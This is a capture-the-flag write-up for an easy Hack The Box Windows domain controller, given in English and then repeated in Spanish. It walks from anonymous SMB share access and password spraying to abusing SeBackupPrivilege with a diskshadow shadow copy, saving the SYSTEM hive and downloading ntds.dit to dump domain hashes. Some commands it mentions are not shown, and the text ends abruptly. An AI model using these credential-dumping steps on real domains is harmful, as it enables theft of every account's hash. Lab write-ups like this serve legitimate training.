HTB easy Windows

Exploitation Summary

The attack began with SMB enumeration against a Windows Domain Controller. Anonymous access to the HR share revealed a welcome document containing a default password left behind by the IT team. With no valid username yet, RID-cycling via netexec was used to enumerate domain user accounts, after which password spraying confirmed that michael.wrightson had never changed that default credential.

Although michael.wrightson lacked WinRM access, his authenticated SMB session was enough to enumerate user descriptions — where david.orelious had carelessly stored his own password in plaintext. His account granted access to the DEV share, which contained a PowerShell backup script hardcoding the credentials of emily.oscars.

emily.oscars had WinRM access and, crucially, held the SeBackupPrivilege right. This privilege allows reading any file on the system regardless of ACLs, making it possible to extract the Active Directory database (ntds.dit) via a Volume Shadow Copy and dump all domain hashes with impacket-secretsdump. The Administrator NT hash was then used for a Pass-the-Hash login, completing the machine.

User Enumeration — RID Cycling

I first attempt to find valid usernames via kerbrute against the Kerberos service, but the wordlist only surfaces the well-known guest and administrator accounts, neither of which is useful here.

Instead, I use RID cycling — a technique that exploits how Windows assigns sequential numeric identifiers (RIDs) to every security principal (users, groups, computers) in the domain. By iterating over these IDs via an authenticated or guest SMB session, it's possible to resolve them back to account names without needing any special privileges:

Privilege Escalation — SeBackupPrivilege

Checking the current token privileges reveals something valuable:

============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled

SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

SeBackupPrivilege allows reading any file on the system, bypassing all filesystem ACLs. This makes it possible to extract the Active Directory database file ntds.dit, which stores all domain credential hashes.

The catch is that ntds.dit is locked while the system is running and cannot be accessed directly. The solution is to create a Volume Shadow Copy of the C: drive and read the file from that snapshot instead.

Creating a Volume Shadow Copy with diskshadow

I create a working directory and a script file for diskshadow:

mkdir C:\temp
cd C:\temp

Contents of C:\temp\shadow.txt:

set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:

These instructions tell diskshadow to create a persistent shadow copy of C: and expose it as drive z:\. I run it:

diskshadow /s C:\temp\shadow.txt

Extracting the SYSTEM hive

The ntds.dit file alone is not enough — Windows encrypts the credential data using a boot key (SysKey) stored in the SYSTEM registry hive. I need both files to decrypt the hashes:

reg save HKLM\SYSTEM C:\temp\system.hiv

I download both files to my local machine:

download ntds.dit
download system.hiv

Dumping Hashes with impacket-secretsdump

Resumen de Explotación

El ataque comenzó con enumeración SMB contra un Domain Controller de Windows. El acceso anónimo al share HR reveló un documento de bienvenida con una contraseña por defecto dejada por el equipo de TI. Sin usuarios válidos todavía, se utilizó RID-cycling mediante netexec para enumerar las cuentas del dominio, tras lo cual el password spraying confirmó que michael.wrightson nunca cambió esa credencial por defecto.

Aunque michael.wrightson no tenía acceso por WinRM, su sesión SMB autenticada fue suficiente para enumerar las descripciones de los usuarios — donde david.orelious había guardado su propia contraseña en texto claro. Su cuenta daba acceso al share DEV, que contenía un script PowerShell de backup con las credenciales de emily.oscars hardcodeadas.

emily.oscars tenía acceso WinRM y, lo más importante, disponía del privilegio SeBackupPrivilege. Este privilegio permite leer cualquier archivo del sistema independientemente de las ACLs, lo que hizo posible extraer la base de datos de Active Directory (ntds.dit) mediante una copia de volumen en sombra y volcar todos los hashes del dominio con impacket-secretsdump. El hash NT del Administrador se utilizó después para un login Pass-the-Hash, completando la máquina.

Escalada de Privilegios — SeBackupPrivilege

Compruebo los privilegios del token actual y encuentro algo valioso:

whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

SeBackupPrivilege permite leer cualquier archivo del sistema, saltándose todas las ACLs del sistema de archivos. Esto hace posible extraer el archivo de base de datos de Active Directory ntds.dit, que almacena todos los hashes de credenciales del dominio.

El problema es que ntds.dit está bloqueado mientras el sistema está activo y no se puede acceder directamente. La solución es crear una copia de volumen en sombra (Volume Shadow Copy) de la unidad C: y leer el archivo desde esa instantánea.

Creando una Copia de Volumen en Sombra con diskshadow

Creo un directorio de trabajo y un archivo de script para diskshadow:

mkdir C:\temp
cd C:\temp

Contenido de C:\temp\shadow.txt:

set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% z:

Estas instrucciones indican a diskshadow que cree una copia en sombra persistente de C: y la exponga como unidad z:\. Lo ejecuto:

diskshadow /s C:\temp\shadow.txt

-> add volume c: alias pwn
-> create

[...]
-> expose %pwn% z:

Extrayendo el SYSTEM hive

El archivo ntds.dit solo no es suficiente — Windows encripta los datos de credenciales usando una clave de arranque (SysKey) almacenada en el hive del registro SYSTEM. Necesito ambos archivos para descifrar los hashes:

reg save HKLM\SYSTEM C:\temp\system.hiv

Me bajo los dos archivos a mi máquina local:

download ntds.dit
download system.hiv
